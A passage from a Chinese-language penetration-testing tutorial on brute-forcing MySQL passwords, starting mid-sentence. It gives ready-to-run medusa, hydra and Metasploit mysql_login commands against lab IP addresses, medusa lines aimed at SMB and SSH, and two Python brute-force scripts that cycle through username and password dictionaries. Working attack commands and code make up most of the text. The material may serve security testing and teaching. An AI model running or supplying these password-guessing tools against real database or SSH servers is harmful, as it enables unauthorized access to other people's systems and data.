ns破解空口令和主机名称相同的用户密码，-F破解成功后立刻停止，-u指定root账号，-P指定密码文件为/root/mypass.txt，破解效果如图12所示。  
图12 medusa破解单一MySQL服务器密码  
（2）破解IP地址段MySQL密码  
medusa -M mysql -H host.txt -e ns -F -u root -P /root/mypass.txt  
在前面的基础上，更改前面的密码为12345678：  
GRANT USAGE,SELECT, INSERT, UPDATE, DELETE, SHOW VIEW ,CREATE TEMPORARY
TABLES,EXECUTE ON _._ TO root@'192.168.17.144' IDENTIFIED BY '12345678';  
FLUSH PRIVILEGES;  
再次进行测试，效果如图13所示。  
图13破解多个主机的Mysql密码  
4.破解其它密码  
（1）破解smbnt  
medusa -M smbnt -h 192.168.17.129 -u administrator -P /root/mypass.txt -e ns
-F  
（2）破解ssh密码  
medusa -M ssh -h 192.168.17.129 -u root -P /root/mypass.txt -e ns -F
## 1.8python脚本暴力破解MySQL口令
1.Python版本Mysql爆破简单密码小脚本  
需要安装Python插件MySQL-python，插件下载地址：  
将以下代码保存为：MysqlDatabaseBlasting.py，cmd切换到 MysqlDatabaseBlasting.py路径下，并
执行MysqlDatabaseBlasting.py即可开始破解。
    import MySQLdb
        #coding=gbk
        #目标IP mysql数据库必须开启3360远程登陆端口
        mysql_username = ('root','test', 'admin', 'user')#账号字典
        common_weak_password = ('','123456','test','root','admin','user')#密码字典
        success = False
        host = "127.0.0.1"#数据库IP地址
        port = 3306
        for username in mysql_username:
          for password in common_weak_password:
            try:
              db = MySQLdb.connect(host, username, password)
              success = True
              if success:
                print username, password
            except Exception, e:
              pass
2.“独自等待”写的MySQL暴力破解工具单线程版
使用本工具前，请确保脚本同目录下存在user.txt,pass.txt两个文件，用法:  
mysqlbrute.py 待破解的ip/domain 端口 数据库 用户名列表 密码列表  
实例: mysqlbrute.py www.waitalone.cn 3306 test user.txt pass.txt  
程序需要MySQLdb支持，下载地址  
mysqlbrute.py文件代码：
    #!/usr/bin/env python
        # -*- coding: gbk -*-        # -*- coding: utf-8 -*-        # Date: 2014/11/10
        # Created by 独自等待
        # 博客 http://www.waitalone.cn/
        import os, sys, re, socket, time
        try:
            import MySQLdb
        except ImportError:
            print '\n[!] MySQLdb模块导入错误,请到下面网址下载：'
            print '[!] http://www.codegood.com/archives/129'
            exit()
        def usage():
            print '+' + '-' * 50 + '+'
            print '\t   Python MySQL暴力破解工具单线程版'
            print '\t   Blog：http://www.waitalone.cn/'
            print '\t\t Code BY： 独自等待'
            print '\t\t Time：2014-11-10'
            print '+' + '-' * 50 + '+'
            if len(sys.argv) != 6:
                print "用法: " + os.path.basename(sys.argv[0]) + " 待破解的ip/domain 端口 数据库 用户名列表 密码列表"
                print "实例: " + os.path.basename(sys.argv[0]) + " www.waitalone.cn  3306  test user.txt pass.txt"
                sys.exit()
        def mysql_brute(user, password):
            "mysql数据库破解函数"
            db = None
            try:
                # print "user:", user, "password:", password
                db = MySQLdb.connect(host=host, user=user, passwd=password, db=sys.argv[3], port=int(sys.argv[2]))
                # print '[+] 破解成功：', user, password
                result.append('用户名：' + user + "\t密码：" + password)
            except KeyboardInterrupt:
                print '大爷,按您的吩咐,已成功退出程序!'
                exit()
            except MySQLdb.Error, msg:
                # print '未知错误大爷:', msg
                pass
            finally:
                if db:
                    db.close()
        if __name__ == '__main__':
            usage()
            start_time = time.time()
            if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
                host = sys.argv[1]
            else:
                host = socket.gethostbyname(sys.argv[1])
            userlist = [i.rstrip() for i in open(sys.argv[4])]
            passlist = [j.rstrip() for j in open(sys.argv[5])]
            print '\n[+] 目  标：%s \n' % sys.argv[1]
            print '[+] 用户名：%d 条\n' % len(userlist)
            print '[+] 密  码：%d 条\n' % len(passlist)
            print '[!] 密码破解中,请稍候……\n'
            result = []
            for x in userlist:
                for j in passlist:
                    mysql_brute(x, j)
            if len(result) != 0:
                print '[+] 恭喜大爷,MySQL密码破解成功!\n'
                for x in {}.fromkeys(result).keys():
                    print x + '\n'
            else:
                print '[-] 杯具了大爷,MySQL密码破解失败!\n'
        print '[+] 破解完成，用时： %d 秒' % (time.time() - start_time)
## 1.9扫描总结
1.好用的工具  
通过实际测试MSF、xHydra、Hydra、Bruter、Medusa都能很好的对MySQL口令进行暴力破解，其中Msf平台具有综合功能，在暴力破解成功后可以继续进行渗透。xHydra、Hydra和Medusa支持多地址破解，Bruter对单一密码漏洞验证效果比较快。  
2.工具命令总结  
(1)Msf单一模式扫描登录验证
    use auxiliary/scanner/mysql/mysql_login
    set rhosts 192.168.157.130
    set username root
    set password 11111111
    run
（2）Msf使用字典对某个IP地址进行暴力破解
    use auxiliary/scanner/mysql/mysql_login
    set RHOSTS 192.168.157.130
    set pass_file “/root/top10000pwd.txt”
    set username root
    run
（3）msf密码验证
    use auxiliary/admin/mysql/mysql_sql
    set RHOSTS 192.168.157.130
    set password 11111111
    set username root
    run
（4）hydra单一用户名和密码进行验证破解  
hydra -l root -p11111111 -t 16 192.168.157.130 mysql  
（5）hydra使用字典破解单一用户  
hydra -l root -P /root/Desktop/top10000pwd.txt -t 16 192.168.157.130 mysql  
（6）hydra对多个IP地址进行root账号密码破解  
hydra -l root -P /root/newpass.txt -t 16 -M /root/ip.txt mysql  
（7）medusa使用字典文件破解192.168.17.129主机root账号密码  
medusa -M mysql -h192.168.17.129 -e ns -F -u root -P /root/mypass.txt  
（8）medusa破解IP地址段MySQL密码  
medusa -M mysql -H host.txt -e ns -F -u root -P /root/mypass.txt